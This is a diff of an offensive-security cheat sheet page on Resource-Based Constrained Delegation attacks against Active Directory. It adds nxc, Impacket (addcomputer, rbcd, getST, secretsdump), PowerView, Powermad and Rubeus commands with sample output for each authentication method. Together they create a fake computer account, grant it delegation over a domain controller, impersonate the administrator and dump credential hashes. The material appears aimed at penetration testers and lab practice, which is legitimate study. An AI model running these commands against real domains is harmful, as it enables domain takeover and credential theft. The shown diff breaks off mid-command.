@@ -1,7 +1,9 @@
 ---
 title: "RBCD Attack"
-tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Ticket", "Active Directory", "Windows", "RBCD", "Resource-Based Constrained Delegation", "S4U", "Impersonate", "Credential Dumping", "Genericall", "WriteAccountRestrictions", "SPN-less"]
+tags: ["Active Directory", "RBCD Attack", "Credential Dumping", "Genericall", "Impersonate", "Pass-The-Hash", "Pass-The-Ticket", "RBCD", "Resource-Based Constrained Delegation", "S4U", "SPN-less", "Silver Ticket", "Ticket Granting Ticket", "Windows", "WriteAccountRestrictions"]
 ---
+
+{{< filter_buttons >}}
 
 ### RBCD Attack
 
@@ -9,42 +11,143 @@ tags: ["Pass-The-Ticket", "Pass-The-Hash", "Silver Ticket", "Ticket Granting Tic
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Create a Fake Computer \[Optional\]
+#### 1. Check Machine Quota \[Optional\]
 
-```console
-# Check machine account quota
-nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -M maq
+```console {class="password"}
+# Password
+nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M maq
 ```
 
 ```console {class="sample-code"}
-$ nxc ldap example.com -u 'test.user' -p 'Test1234' -M maq
-SMB         10.10.11.10      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:False)
-LDAP        10.10.11.10      389    DC               [+] example.com\test.user:Test1234 
-MAQ         10.10.11.10      389    DC               [*] Getting the MachineAccountQuota
-MAQ         10.10.11.10      389    DC               MachineAccountQuota: 10
+$ nxc ldap DC01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! 
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
 ```
 
-```console
-# Add a fake computer
-impacket-addcomputer -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+```console {class="ntlm"}
+# NTLM
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M maq
 ```
 
 ```console {class="sample-code"}
-$ impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'Test1234' -dc-ip 10.10.11.10 'example.com/test.user:Test1234'
+$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M maq
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -p 'Password123!' -d giveback.htb -k --kdcHost dc01.example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:Password123! 
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M maq
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d giveback.htb -k --kdcHost dc01.example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+LDAP        10.10.72.181    389    DC01          [+] example.com\apple.seed:2B576ACBE6BCFDA7294D6BD18041B8FE
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc ldap <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M maq
+```
+
+```console {class="sample-code"}
+$ nxc ldap dc01.example.com -u 'apple.seed' -d giveback.htb -k --use-kcache --kdcHost dc01.example.com -M maq
+LDAP        10.10.72.181    389    DC01          [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com)
+MAQ         10.10.72.181    389    DC01          [*] Getting the MachineAccountQuota
+MAQ         10.10.72.181    389    DC01          MachineAccountQuota: 10
+```
+
+#### 2. Create a Fake Computer \[Optional\]
+
+```console {class="password"}
+# Password
+impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
+```
+
+```console {class="sample-code"}
+$ impacket-addcomputer 'example.com/apple.seed:Password123!' -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
-[*] Successfully added machine account EvilComputer$ with password Test1234.
+[*] Successfully added machine account EvilComputer$ with password Password123!.
 ```
 
-#### 2. Get Service Principle Name (SPN) \[Optional\]
+```console {class="ntlm"}
+# NTLM
+impacket-addcomputer '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
+```
 
-```console
+```console {class="sample-code"}
+$ impacket-addcomputer 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Successfully added machine account EvilComputer$ with password Password123!.
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
+```
+
+```console {class="sample-code"}
+$ impacket-addcomputer 'example.com/apple.seed:Password123!' -k -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Successfully added machine account EvilComputer$ with password Password123!.
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-addcomputer '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
+```
+
+```console {class="sample-code"}
+$ impacket-addcomputer 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Successfully added machine account EvilComputer$ with password Password123!.
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-addcomputer '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -computer-name '<COMPUTER>' -computer-pass '<COMPUTER_PASSWORD>'
+```
+
+```console {class="sample-code"}
+$ impacket-addcomputer 'example.com/apple.seed' -k -computer-name 'EvilComputer' -computer-pass 'Password123!' -dc-ip 10.10.11.10
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Successfully added machine account EvilComputer$ with password Password123!.
+```
+
+#### 3. Get Service Principle Name (SPN) \[Optional\]
+
+```console {class="password"}
 # Password
 impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request
 ```
 
 ```console {class="sample-code"}
-$ impacket-GetUserSPNs 'example.com/svc_web:Password' -dc-ip 10.10.132.53 -request                                 
+$ impacket-GetUserSPNs 'example.com/svc_web:Password123!' -dc-ip 10.10.11.10 -request                                 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
@@ -52,24 +155,135 @@ ServicePrincipalName      Name             MemberOf  PasswordLastSet            
 MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
 ```
 
-```console
-# Kerberos
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -k
-```
-
-```console
-# If NTLM auth is disabled
-sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
-```
-
-#### 3. RBCD Attack \[Control over an Account with SPN\]
-
-```console
-impacket-rbcd -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
+```console {class="ntlm"}
+# NTLM
+impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -request
 ```
 
 ```console {class="sample-code"}
-$ impacket-rbcd -delegate-to 'DC$' -delegate-from 'EvilComputer$' -dc-ip 10.10.11.10 -action 'write' 'example.com/test.user:Test1234' 
+$ impacket-GetUserSPNs 'example.com/svc_web' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
+MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -request
+```
+
+```console {class="sample-code"}
+$ impacket-GetUserSPNs 'example.com/svc_web:Password123!' -k -dc-ip 10.10.11.10 -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
+MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-GetUserSPNs '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -request
+```
+
+```console {class="sample-code"}
+$ impacket-GetUserSPNs 'example.com/svc_web' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
+MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-GetUserSPNs '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -request
+```
+
+```console {class="sample-code"}
+$ impacket-GetUserSPNs 'example.com/svc_web' -k -dc-ip 10.10.11.10 -request
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName      Name             MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------  ---------------  --------  --------------------------  --------------------------  ----------   
+MSSQL/ms01.example.com  svc_web            2023-06-07 17:48:26.340517  2025-08-06 08:14:20.426867
+```
+
+#### 4. RBCD Attack \[Control over an Account with SPN\]
+
+```console {class="password"}
+# Password
+impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed:Password123!' -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed:Password123!' -k -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EvilComputer$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EvilComputer$   (S-1-5-21-3542429192-2036945976-3483670807-11601)
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-rbcd '<DOMAIN>/<USER>' -k -dc-ip <DC_IP> -delegate-from '<COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action 'write'
+```
+
+```console {class="sample-code"}
+$ impacket-rbcd 'example.com/apple.seed' -k -dc-ip 10.10.11.10 -delegate-from 'EvilComputer$' -delegate-to 'DC$' -action 'write'
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
@@ -83,15 +297,15 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 <br>
 <small>*Note: Remove trailing $ if not a machine account.*</small>
 
-#### 4. Impersonate
+#### 5. Impersonate
 
-```console
+```console {class="password"}
 # Password
-sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER>:<COMPUTER_PASSWORD>'
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>:<COMPUTER_PASSWORD>' -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc.example.com && impacket-getST -spn cifs/dc.example.com -impersonate administrator -dc-ip 10.10.11.10 'example.com/EvilComputer:Test1234'
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer:Password123!' -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 
 [-] CCache file is not found. Skipping...
@@ -102,41 +316,88 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
 ```
 
-```console
+```console {class="ntlm"}
 # NTLM
-sudo ntpdate -s <DC_IP> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<COMPUTER>' -hashes ':<HASH>'
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>' -hashes :<HASH> -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
 ```
 
-#### 5. Import Ticket
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>:<COMPUTER_PASSWORD>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer:Password123!' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>' -hashes :<HASH> -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+sudo ntpdate -s <DC_IP> && impacket-getST '<DOMAIN>/<COMPUTER>' -k -dc-ip <DC_IP> -spn <SPN> -impersonate <TARGET_USER>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.10.11.10 && impacket-getST 'example.com/EvilComputer' -k -dc-ip 10.10.11.10 -spn cifs/dc.example.com -impersonate administrator
+Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_dc.example.com@EXAMPLE.COM.ccache
+```
+
+#### 6. Secrets Dump
 
 ```console
-export KRB5CCNAME='<CCACHE_FILE>'
+# Pass-the-ticket
+export KRB5CCNAME='<CCACHE>'
 ```
 
 ```console {class="sample-code"}
 $ export KRB5CCNAME='administrator@cifs_dc.example.com@EXAMPLE.COM.ccache'
 ```
 
-#### 6. Post-Attack
-
 ```console
-# Remote
-sudo ntpdate -s <DC_IP> && impacket-psexec <DOMAIN>/<TARGET_USER>@<TARGET_DOMAIN> -k -no-pass
-```
-
-```console {class="sample-code"}
-$ sudo ntpdate -s dc.example.com && wmiexec.py example.com/administrator@dc.example.com -k -no-pass
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
-
-[*] SMBv3.0 dialect used
-[!] Launching semi-interactive shell - Careful what you execute
-[!] Press help for extra shell commands
-C:\>
-```
-
-```console
-# Or secretsdump
-impacket-secretsdump <TARGET_USER>@<TARGET_DOMAIN> -k -no-pass
+# Ticket-based Kerberos
+impacket-secretsdump <TARGET_USER>@<TARGET> -k -no-pass
 ```
 
 ```console {class="sample-code"}
@@ -160,7 +421,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> . .\PowerView.ps1
 ```
 
 ```console
@@ -168,7 +429,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ddf32e17a6ac5ce04a8ecbf782ca
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> . .\Powermad.ps1
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> . .\Powermad.ps1
 ```
 
 <small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>
@@ -180,7 +441,7 @@ Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccount
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> Get-DomainObject -Identity 'DC=EXAMPLE,DC=COM' | select ms-ds-machineaccountquota
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> Get-DomainObject -Identity 'DC=EXAMPLE,DC=COM' | select ms-ds-machineaccountquota
 
 ms-ds-machineaccountquota
 -------------------------
@@ -190,23 +451,23 @@ ms-ds-machineaccountquota
 #### 3. Create New Computer Account
 
 ```console
-New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
+New-MachineAccount -MachineAccount <COMPUTER> -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> New-MachineAccount -MachineAccount EvilComputer -Password
-$(ConvertTo-SecureString 'Test1234' -AsPlainText -Force)
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> New-MachineAccount -MachineAccount EvilComputer -Password
+$(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
 [+] Machine account EvilComputer added
 ```
 
 #### 4. RBCD Attack
 
 ```console
-$fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
+$fakesid = Get-DomainComputer <COMPUTER> | select -expand objectsid
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
 ```
 
 ```console
@@ -214,7 +475,7 @@ $fakesid
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $fakesid
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $fakesid
 S-1-5-21-3542429192-2036945976-3483670807-11601
 ```
 
@@ -223,7 +484,7 @@ $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:B
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
 ```
 
 ```console
@@ -231,7 +492,7 @@ $SDBytes = New-Object byte[] ($SD.BinaryLength)
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
 ```
 
 ```console
@@ -239,7 +500,7 @@ $SD.GetBinaryForm($SDBytes, 0)
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $SD.GetBinaryForm($SDBytes, 0)
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $SD.GetBinaryForm($SDBytes, 0)
 ```
 
 ```console
@@ -247,7 +508,7 @@ Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoac
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
 
 #### 5. Check if SecurityIdentifier is Now fakesid 
@@ -257,7 +518,7 @@ $RawBytes = Get-DomainComputer <TARGET_COMPUTER> -Properties 'msds-allowedtoacto
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
 ```
 
 ```console
@@ -265,7 +526,7 @@ $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentL
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
 ```
 
 ```console
@@ -273,7 +534,7 @@ $Descriptor.DiscretionaryAcl
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> $Descriptor.DiscretionaryAcl
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> $Descriptor.DiscretionaryAcl
 
 
 BinaryLength       : 36
@@ -293,11 +554,12 @@ AuditFlags         : None
 #### 6. Impersonate
 
 ```console
-.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:EvilComputer /domain:<DOMAIN>
+# Calculate NTLM
+.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:<COMPUTER> /domain:<DOMAIN>
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\test.user\Documents> .\rubeus.exe hash /password:'Test1234' /user:EvilComputer /domain:example.com
+*Evil-WinRM* PS C:\Users\apple.seed\Documents> .\rubeus.exe hash /password:'Password123!' /user:EvilComputer /domain:example.com
 
    ______        _
   (_____ \      | |
@@ -311,7 +573,7 @@ AuditFlags         : None
 
 [*] Action: Calculate Password Hash(es)
 
-[*] Input password             : Test1234
+[*] Input password             : Password123!
 [*] Input username             : EvilComputer
 [*] Input domain               : example.com
 [*] Salt                       : EXAMPLE.COMEvilComputer
@@ -322,11 +584,12 @@ AuditFlags         : None
 ```
 
 ```console
-.\rubeus.exe s4u /user:'EvilComputer$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
+# Impersonate
